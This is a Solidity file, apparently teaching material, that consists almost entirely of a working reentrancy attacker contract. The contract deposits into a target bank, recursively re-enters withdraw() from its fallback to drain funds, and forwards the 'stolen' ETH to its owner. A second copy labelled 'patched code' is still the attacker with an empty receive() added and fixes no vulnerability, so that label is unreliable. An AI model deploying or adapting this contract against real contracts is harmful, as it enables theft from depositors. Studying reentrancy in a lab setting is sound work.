// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/*
=========================================================
PRACTICAL: Reentrancy Attacker Contract
CONCEPT: Recursive ETH drain
=========================================================

WARNING:
This is an EDUCATIONAL ATTACK DEMO ONLY.

Do NOT deploy against real contracts.
=========================================================
*/

interface IVulnerableBank {
    function withdraw(uint256 amount) external;
    function deposit() external payable;
}

/*
=========================================================
ATTACK CONTRACT
=========================================================
*/

contract ReentrancyAttackerVul {

    IVulnerableBank public bank;
    address public owner;

    uint256 public attackAmount;
    bool public attacking;

    constructor(address _bank) {
        bank = IVulnerableBank(_bank);
        owner = msg.sender;
    }

    /*
    =====================================================
    START ATTACK
    =====================================================
    */

    function attack() external payable {
        require(msg.sender == owner, "Only owner");

        /*
            Store attack amount
        */
        attackAmount = msg.value;

        /*
            Step 1:
            Deposit ETH into vulnerable bank
        */
        bank.deposit{value: msg.value}();

        /*
            Step 2:
            Start withdrawal (triggers reentrancy)
        */
        attacking = true;
        bank.withdraw(msg.value);
        attacking = false;
    }

    /*
    =====================================================
    FALLBACK FUNCTION (REENTRANCY POINT)
    =====================================================
    */

    fallback() external payable {

        /*
        =================================================
        CRITICAL REENTRANCY LOOP
        =================================================

        This runs when bank sends ETH back.

        BEFORE bank updates balance,
        attacker re-enters withdraw().
        */

        if (attacking) {

            uint256 bankBalance =address(bank).balance;

            /*
                Continue attacking while bank has funds.
            */
            if (bankBalance >= attackAmount) {

                bank.withdraw(attackAmount);
            }
        }
    }

    /*
    =====================================================
    COLLECT STOLEN ETH
    =====================================================
    */

    function withdrawStolen() external {
        require(msg.sender == owner, "Only owner");

        payable(owner).transfer(address(this).balance);
    }

    /*
    =====================================================
    VIEW CONTRACT BALANCE
    =====================================================
    */

    function getBalance()
        external
        view
        returns (uint256)
    {
        return address(this).balance;
    }
}


//patched code
contract ReentrancyAttacker {

    IVulnerableBank public bank;
    address public owner;

    uint256 public attackAmount;
    bool public attacking;

    constructor(address _bank) {
        bank = IVulnerableBank(_bank);
        owner = msg.sender;
    }

    /*
    =====================================================
    START ATTACK
    =====================================================
    */

    function attack() external payable {
        require(msg.sender == owner, "Only owner");

        /*
            Store attack amount
        */
        attackAmount = msg.value;

        /*
            Step 1:
            Deposit ETH into vulnerable bank
        */
        bank.deposit{value: msg.value}();

        /*
            Step 2:
            Start withdrawal (triggers reentrancy)
        */
        attacking = true;
        bank.withdraw(msg.value);
        attacking = false;
    }

    /*
    =====================================================
    FALLBACK FUNCTION (REENTRANCY POINT)
    =====================================================
    */

    fallback() external payable {

        /*
        =================================================
        CRITICAL REENTRANCY LOOP
        =================================================

        This runs when bank sends ETH back.

        BEFORE bank updates balance,
        attacker re-enters withdraw().
        */

        if (attacking) {
            uint256 bankBalance =address(bank).balance;
            /*
                Continue attacking while bank has funds.
            */
            if (bankBalance >= attackAmount) {
                bank.withdraw(attackAmount);
            }
        }
    }

    /*
    =====================================================
    COLLECT STOLEN ETH
    =====================================================
    */

    function withdrawStolen() external {
        require(msg.sender == owner, "Only owner");

        payable(owner).transfer(address(this).balance);
    }

    /*
    =====================================================
    VIEW CONTRACT BALANCE
    =====================================================
    */

    function getBalance() external view returns (uint256){
        return address(this).balance;
    }

    receive() external payable {
        
    }
}